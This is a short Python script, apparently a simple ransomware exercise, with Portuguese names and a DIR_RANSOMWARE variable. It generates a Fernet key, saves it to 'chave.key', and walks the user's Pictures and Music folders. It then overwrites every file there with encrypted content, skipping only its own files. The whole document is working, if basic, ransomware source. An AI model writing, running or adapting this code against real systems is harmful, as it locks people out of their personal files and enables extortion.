import os
from cryptography.fernet import Fernet

DIR_RANSOMWARE = os.path.dirname(os.path.dirname(__file__))
DIR_USER = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(DIR_RANSOMWARE)))))

PASTA_IMAGENS = os.path.join(DIR_USER, "Imagens")
PASTA_MUSICAS = os.path.join(DIR_USER, "Músicas")


key = Fernet.generate_key()
with open('chave.key', 'wb') as chave:
    chave.write(key)

username = os.getenv('USERNAME')
folders = [
    PASTA_IMAGENS,
    PASTA_MUSICAS
]

arquivos = []

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file in ['01main.py', 'chave.key', 'desktop.ini']:
                continue

            file_path = os.path.join(root, file)
            arquivos.append(file_path)
            
for arquivo in arquivos:
    with open(arquivo, 'rb') as file:
        conteudo = file.read()

        conteudo_criptografado = Fernet(key).encrypt(conteudo)

        with open(arquivo, 'wb') as file:
            file.write(conteudo_criptografado)
print(arquivos)